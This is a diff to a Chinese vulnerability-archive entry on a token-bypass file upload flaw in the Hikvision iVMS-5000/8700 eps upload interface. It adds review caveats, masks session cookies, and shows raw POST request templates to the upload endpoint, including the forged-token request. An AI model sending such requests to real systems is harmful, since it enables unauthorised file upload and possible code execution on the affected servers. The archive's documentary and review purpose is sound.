@@ -1,8 +1,61 @@
 ---
 source: "MrWQ/vulnerability-paper"
+id: "vw-54190e5390e07381881d53b1"
+entity_id: "ve-54190e5390e07381881d53b1"
+schema_version: "1"
+title: "海康威视 iVMS eps 上传接口与令牌绑定历史分析（样例待核）"
+product: "Hikvision iVMS-5000/8700"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+identifier_role: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+prerequisites: "token绑定完整URL，版本仅产品系列；带会话但角色未明"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%20iVMS%20%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%880day%EF%BC%89.md"
+review_date: "2026-10-02"
+side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留；执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
+source_url: "https://mp.weixin.qq.com/s/AyUlf2p80_CTCnCB4w058w"
+source_status: "recorded"
 ---
 
-# 海康威视 iVMS 综合安防系统任意文件上传漏洞复现（0day）
+# 海康威视 iVMS eps 上传接口与令牌绑定历史分析（样例待核）
+
+<!-- article-review:devices:begin -->
+## 技术校订与证据边界（2026-10-02）
+
+- 产品/组件：Hikvision iVMS-5000/8700
+- 本文讨论：eps/api/resourceOperations/upload硬编码token与上传
+- 版本、权限与配置前提：token绑定完整URL，版本仅产品系列；带会话但角色未明
+- 资料类型：token绕过上传分析；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果
+
+保留正文对 eps 上传入口及 URL 绑定摘要机制的分析，按待核技术资料收录。Cookie 字符串和 multipart 字段缺失限制了样例的可运行性，但不抹去前文机制说明；HTTP 200 不能证明上传或执行成功，原标题的 0day 状态、具体构建与会话要求仍未确认。
+
+### 逐项校订
+
+- Python Cookie字符串未闭合导致语法错误
+- 检测只看HTTP200且未上传验证，易误报；异常全吞没
+- multipart缺name/filename和终止边界，非完整上传请求
+- token描述url需含接口路径而非只站点；0day/在野状态缺日期和来源
+- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+- Cookie 字符串与 multipart 的字段在原文中缺失，不能猜出合法会话或完整表单。保留 URL 绑定摘要机制及原始片段，缺失数据标为待核；HTTP 200 不代表上传或执行成功。
+- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
+
+### 操作风险与恢复
+
+- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留
+- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
+
+### 待核与来源
+
+- 具体构建、会话要求与受影响产品范围待核
+- 引用图片未查看，截图内容及有效性待核验
+- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
+- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
+<!-- article-review:devices:end -->
+
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/AyUlf2p80_CTCnCB4w058w)
@@ -120,7 +173,7 @@ bp 抓取首页包，尝试访问接口（发现 token 需要进行鉴权）
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4r5bGpNjUfImPmZGLHicNqvtk6enTCRwPnxics5oJUZib20Ffcszh7qYicCOLDMQcHThicxqm4kGnQukRQ/640?wx_fmt=png)
 
-```
+```http
 POST /eps/api/resourceOperations/upload HTTP/1.1
 Host: your-ip
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
@@ -129,7 +182,7 @@ Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Referer: http://you-ip
 Connection: close
-Cookie: ISMS_8700_Sessionname=7634604FBE659A8532E666FE4AA41BE9
+Cookie: ISMS_8700_Sessionname=763**************************BE9
 Upgrade-Insecure-Requests: 1
 Content-Length: 62
 service=http%3A%2F%2Fx.x.x.x%3Ax%2Fhome%2Findex.action
@@ -154,14 +207,14 @@ token 值需要进行 MD5 加密（32 位大写）
 
 构造文件上传 payload
 
-```
+```http
 POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1
 Host: your-ip
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Connection: close
-Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988
+Cookie: ISMS_8700_Sessionname=A29**************************988
 Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo
 Upgrade-Insecure-Requests: 1
 Content-Length: 174
